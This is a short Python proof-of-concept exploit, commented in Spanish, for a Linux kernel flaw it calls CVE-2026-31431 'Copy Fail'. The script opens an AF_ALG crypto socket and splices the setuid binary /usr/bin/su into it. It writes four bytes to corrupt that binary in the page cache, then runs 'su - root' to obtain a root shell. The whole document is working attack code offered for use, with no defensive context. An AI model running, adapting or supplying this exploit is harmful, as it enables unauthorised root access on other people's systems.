import os
import socket

print("[*] Launching CVE-2026-31431 Copy Fail PoC...")

# 1. Configurar los sockets de la interfaz criptográfica del kernel (AF_ALG)
# Se inicializa el algoritmo vulnerable authencesn (AEAD)
sock_alg = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
sock_alg.bind(("aead", "authencesn(crypt(data))"))
sock_op, _ = sock_alg.accept()

# 2. Configurar una clave y la operación de descifrado
sock_op.setsockopt(socket.SOL_ALG, socket.ALG_SET_KEY, b"\x00" * 32)
sock_op.sendmsg([b"\x00" * 16], [(socket.SOL_ALG, socket.ALG_SET_OP, 0)]) # 0 = Decrypt

# 3. Abrir el binario objetivo con privilegios setuid-root (/usr/bin/su)
# Se abre en modo lectura para mapear sus páginas en el Page Cache del kernel
fd_su = os.open("/usr/bin/su", os.O_RDONLY)

# 4. Forzar el bug lógico solapando los scatterlists (In-place execution)
# Con splice() redirigimos el flujo del descriptor de archivo hacia el socket
# Esto engaña al kernel para que el buffer de origen coincida con el de destino (src == dst)
os.splice(fd_su, sock_op.fileno(), 0, 0, 4, 0)

# 5. Modificar los 4 bytes críticos en el Page Cache (RAM)
# En un kernel vulnerable, esto corrompe la validación de identidad en memoria
try:
    sock_op.send(b"\x00\x00\x00\x00")
    print("[+] Page cache corrupted successfully via out-of-bounds SGL write!")
except OSError:
    print("[-] Error: Protocol not available (Unable to exploit out-of-place SGL)")
    print("[-] Exploit failed: Cannot corrupt page cache.")
    exit(1)

# 6. Ejecutar el binario corrompido para obtener la shell con privilegios máximos
print("[*] Triggering compromised setuid binary...")
os.close(fd_su)
os.system("/usr/bin/su - root")
